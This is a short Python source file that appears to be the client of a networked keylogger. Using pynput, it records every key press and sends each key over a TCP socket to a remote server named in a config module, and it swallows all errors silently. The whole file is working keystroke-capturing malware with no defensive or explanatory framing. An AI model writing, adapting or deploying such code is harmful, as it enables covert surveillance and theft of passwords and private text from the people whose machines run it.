import socket
from pynput import keyboard
from src import config, networking


def on_press(key: keyboard.KeyCode | keyboard.Key) -> None:
    try:
        if isinstance(key, keyboard.KeyCode):
            networking.send(server, key.char)
        elif isinstance(key, keyboard.Key):
            networking.send(server, key.name)
    except:
        return


def main():
    try:
        server.connect(config.ADDR)
    except:
        return
    listener.start()

    while True:
        try:
            data = networking.recv(server)
        except:
            break

        if data == config.DISCONNECT:
            break
    
    listener.stop()
    server.close()


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener = keyboard.Listener(on_press=on_press)

if __name__ == "__main__":
    main()
